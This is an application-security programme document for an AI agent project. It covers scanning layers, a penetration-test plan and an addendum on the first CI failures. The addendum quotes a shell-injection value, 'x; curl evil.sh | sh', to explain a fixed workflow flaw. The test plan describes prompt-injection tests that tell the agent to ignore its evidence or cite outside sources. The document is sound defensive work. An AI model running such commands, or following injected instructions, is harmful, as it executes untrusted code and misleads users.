# Security Programme

**Owner:** Application Security Engineer · **Date:** 2026-08-20
**Supersedes:** the Security Engineer role as originally scoped

> The original role produced a threat model and two ADRs and then went quiet for
> four sprints. A threat model that is written once and never exercised is a
> document, not a control. This is what the role does continuously.

---

## 1. Why a threat model alone was not enough

`THREAT_MODEL.md` names 17 threats and their mitigations. Every one of those
mitigations is a claim about code. Nothing in the process checked whether the
code still matched the claim after each sprint.

The programme below converts claims into gates that run.

## 2. Defence layers

| Layer | Tool | Runs | Blocks |
|---|---|---|---|
| **SAST — first party** | CodeQL (`security-extended`) | Every push, weekly | Yes |
| **SAST — rules** | Semgrep (`p/security-audit`, `p/secrets`) | Every push | Yes |
| **SAST — Python** | Ruff `S` (bandit ruleset) | Every push, in CI lint | Yes |
| **Dependency CVEs — Python** | `pip-audit --strict` | Every push, weekly | Yes |
| **Dependency CVEs — npm** | `npm audit --audit-level=high` | Every push, weekly | Yes |
| **Dependency currency** | Dependabot | Weekly | PR |
| **Secrets — project** | `scripts/check-secrets.mjs` | Every push | Yes |
| **Secrets — general** | gitleaks | Every push | Yes |
| **Filesystem & IaC** | Trivy (HIGH, CRITICAL) | Every push, weekly | Yes |
| **Supply chain** | CycloneDX SBOM | Every push | Artifact |
| **DAST** | OWASP ZAP baseline | Weekly, manual | Reports |
| **Header assertion** | `curl` + explicit check | Weekly, manual | Yes |
| **Penetration testing** | Manual, scripted | Sprint 8 and on change | Release gate |

Two scanners for secrets on purpose. Ours knows this project's conventions —
which files are documentation, which placeholders are intentional. gitleaks
knows several hundred credential formats this project has never seen. Neither
subsumes the other.

## 3. Why DAST is scheduled rather than per-push

Static analysis reads code. DAST exercises a running instance, which is where
authentication, rate limiting, headers and injection handling actually live —
and it is the only layer that can catch a control that is correct in the
repository and absent in the response.

It runs weekly and on demand rather than per push because the target is a
free-tier instance with a finite allowance, and scanning it on every commit
would exhaust that allowance to re-prove the same result.

The header job is separate and deliberately crude: it asserts that the headers
`next.config.ts` promises are actually present on a live response. **A header the
config sets and the response omits is a control that exists only in the
repository**, and that failure is invisible to every static tool.

## 4. Penetration test plan (Sprint 8)

Executed against the deployed instance before the release gate.

| # | Test | What a failure would mean |
|---|---|---|
| P-1 | Call the runtime directly, bypassing the BFF | The Space URL alone grants access; rate limits are bypassable |
| P-2 | Replay a captured bearer token from the browser | The token reached the client (T-12) |
| P-3 | Exceed the per-IP limit, then exceed it from a rotated address | The limiter is trivially evaded |
| P-4 | Take Redis offline mid-scan | The limiter fails open (ADR-0007 violated) |
| P-5 | Prompt injection through the incident body: instruct the agent to ignore its evidence | Retrieved content carries instruction authority (T-15) |
| P-6 | Prompt injection via a citation marker pointing outside the evidence set | Fabricated citations pass verification |
| P-7 | Submit a 4,000-character body of repeated tokens | Body length is not a cost bound |
| P-8 | Hold 50 concurrent SSE streams open without reading | Streams are free while idle (T-14) |
| P-9 | Approve a run created by a different session | Approvals are not bound to their run (T-17) |
| P-10 | Request a trace containing a secret-shaped attribute | The span allowlist is not enforced (T-16) |
| P-11 | Force every provider to fail | The system fabricates rather than failing closed (F-2) |
| P-12 | Drive spend past the per-run ceiling | The spend guard is bypassable |

Each is scripted in `apps/agent/scripts/pentest.py` so it is repeatable rather
than a one-time exercise, and each maps to a threat already in the model — a
pen test that finds something the threat model never considered is a finding
about the threat model too.

## 5. Release gate

A release requires: all security workflows green, no unresolved HIGH or CRITICAL
dependency finding, the pen-test script passing against the deployed instance,
and the header assertion passing against the live response.

**The AppSec role signs off separately from QA.** A release blocked on security
is not a quality failure and should not be reported as one.

## 6. What this programme does not do

No WAF, no runtime application self-protection, no intrusion detection. For a
demonstration with no customer data and no tool that can act on a real system,
those would be cost without a corresponding risk. The controls that matter here
are the ones that bound spend and prevent a fabricated answer, and both are
enforced in code rather than at the perimeter.

---

## Addendum, 2026-08-21 — the first run of these pipelines

Every gate above was written and none was verified. The delivery surface then
rendered live CI status and showed the Security workflow failing on **every**
commit, which is the delivery surface doing its job before a human noticed.

Four failures, and they are not the same kind of thing.

### Two were my mistakes

**`aquasecurity/trivy-action@0.28.0` does not exist.** I wrote a version number
without checking it; the current release is `0.36.0`. A security gate that
cannot resolve its own action is a gate that never ran.

**`pip-audit --strict` fails forever on our own package.** `--strict` fails when
any dependency cannot be *audited*, and our package is installed editable and
unpublished, so no advisory database will ever hold an entry for it. The job
failed on the absence of a CVE rather than the presence of one. Without
`--strict` it still exits non-zero on a real vulnerability, which was the point.

### One was a real vulnerability in our own CI

Semgrep's `run-shell-injection` flagged the DAST workflow:

```yaml
run: |
  TARGET="${{ github.event.inputs.target }}"
```

`${{ }}` inside a `run:` block is substituted **before bash sees it**, so a
target of `x; curl evil.sh | sh` would execute in our own pipeline. The target
now arrives through an `env:` binding and is never interpolated into the script
body.

Found by a rule, in a workflow written by the person who added the rule, three
commits after adding it.

### One found four real CVEs, and the answer was a boundary rather than a fix

`pip-audit` reported four remote-code-execution advisories in `transformers`
4.57.6 — malicious `config.json` files reaching code execution through
`from_pretrained`, bypassing `trust_remote_code`.

`transformers` is a **training-only** dependency. ADR-0009 keeps training
frameworks out of the runtime, and the serving path is ONNX plus the Rust
tokenizer core. Audited separately:

| | Packages | Known vulnerabilities |
|---|---|---|
| **Runtime closure** | 77 | **0** |
| Training extras | — | 4 (all `transformers`) |

The runtime package never imports `transformers`, verified by grep and asserted
by a test that parses the serving module's imports.

**ADR-0009 was written for image size and build time. It turns out to be a
security boundary**, and that was not among the reasons for making the decision.

The audit is now split accordingly: the runtime closure blocks on any finding,
and the training extras report. The exposure of the second is a developer
machine loading models from the Hub, which is a real risk with a different owner,
and blocking a release on it would be blocking the wrong thing.

### Findings verified rather than suppressed

Semgrep's 14 SQL-injection findings were checked rather than silenced. Every
f-string SQL statement is in the ANN benchmark and uses a module constant for
the table name, with all values parameterised. No request data reaches SQL
anywhere in the codebase, confirmed by search. The pattern is present and the
vulnerability is not.

Model artifacts are excluded from Semgrep: `tokenizer.json` is a 700 KB BERT
vocabulary that times out the AWS ruleset and matches `public-s3-bucket` on
ordinary English words. Excluding a data file is not suppressing a finding about
code.

### Accepted, with a named mitigation

Semgrep flags three uses of mutable action tags (`@v5` rather than a commit
SHA), which is a genuine supply-chain risk. Accepted for now: Dependabot tracks
`github-actions` weekly, so an action that changes under a tag surfaces as a
pull request. Pinning to SHAs is the stronger control and is deferred rather
than dismissed.
